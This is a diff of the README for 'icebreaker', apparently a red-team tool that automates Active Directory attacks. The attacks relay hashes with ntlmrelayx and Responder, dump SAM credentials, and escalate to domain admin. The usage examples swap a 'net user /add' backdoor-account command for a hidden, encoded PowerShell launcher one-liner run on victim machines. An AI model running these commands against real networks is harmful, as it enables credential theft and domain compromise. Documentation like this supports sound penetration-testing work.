@@ -1,8 +1,8 @@
-icebreaker - BETA (stable release in mid March)
-------
+# icebreaker
+
 Break the ice with that cute Active Directory environment over there. When you're cold and alone staring in at an Active Directory party but don't possess even a single AD credential to join the fun, this tool's for you.
 
-Sequentially automates 5 network attacks against Active Directory to deliver you plaintext credentials when you're on the internal network. Can also automatically acquire domain admin privileges after successfully performing attacks four and five through the use of the --auto option.
+Sequentially automates 5 internal network attacks against Active Directory to deliver you plaintext credentials. Use the --auto option to automatically acquire domain admin privileges after gaining a foothold.
 
 ## Summary Details
 The following attacks are performed sequentially until the fourth and fifth attacks which run in parallel and indefinitely.
@@ -77,11 +77,11 @@ pipenv shell
 
 #### Usage
 Run as root.
-Read from a newline separated list of IP addresses (single IPs or CIDR ranges) and instead of having ntlmrelayx add a user and mimikatz the victim upon hash relay, have it execute a custom command on the victim machine. 
+Read from a newline separated list of IP addresses (single IPs or CIDR ranges) and instead of having ntlmrelayx add a user and mimikatz the victim upon hash relay, have it execute a custom command on the victim machine. In this example we're giving it a command similar to what Empire might give us for a powershell launcher one-liner.
 
-```./icebreaker -l targets.txt -c "net user /add User1 P@ssw0rd"```
+```./icebreaker -l targets.txt -c "powershell -nop -w hidden -exec bypass -enc WwFk..."```
 
-Read from a hostlist, tell Responder to use the eth0 interface rather than the default gateway interface, let Responder run for 30m instead of the usual 10m, and run the default ntlmrelayx post-relay commands to dump the SAM off the victim server
+Read from a hostlist, tell Responder to use the eth0 interface rather than the default gateway interface, let Responder run for 30m instead of the usual 10m, and run the default ntlmrelayx post-relay commands to dump the SAM off the victim server.
 
 ```./icebreaker -l targets.txt -i eth0 -t 30 -c default```
 
